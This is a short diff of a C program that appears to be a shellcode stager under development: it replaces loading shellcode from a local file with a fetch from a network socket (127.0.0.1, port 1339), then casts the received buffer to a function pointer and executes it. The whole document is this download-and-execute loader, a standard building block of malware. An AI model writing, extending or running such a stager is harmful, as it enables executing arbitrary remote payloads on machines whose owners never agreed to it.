@@ -1,7 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-
+#include "fetcher.h"
 
 
 char *shellcode_gen(const char *file_input, int shellcode_index[30]){
@@ -25,8 +25,9 @@ char *shellcode_gen(const char *file_input, int shellcode_index[30]){
 
 int main(){
 	int shellcode_array[30] = {1,2};
-	char *shellcode_location = shellcode_gen("/root/Desktop/ANGRYDICKENS/test.txt",shellcode_array);
-	void (*run_shellcode)() = shellcode_location;
+	//char *shellcode_location = shellcode_gen("/root/Desktop/ANGRYDICKENS/test.txt",shellcode_array);
+	char *shellcode_location = fetch("127.0.0.1",1339);
+	void (*run_shellcode)() = shellcode_location+5;
 	run_shellcode();
 	
 	return 0;
